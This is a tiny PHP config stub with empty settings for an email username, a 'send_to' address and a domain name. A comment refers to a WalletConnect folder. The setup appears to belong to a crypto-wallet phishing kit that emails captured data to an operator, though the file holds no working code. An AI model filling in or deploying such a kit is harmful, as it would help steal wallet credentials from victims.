<?php 
	
$username = ""; //Username of email account

$send_to = ""; //Email to send to

$domainName = ""; //without https:// and .com


//go to walletconnect folder and config file for another configuration

?>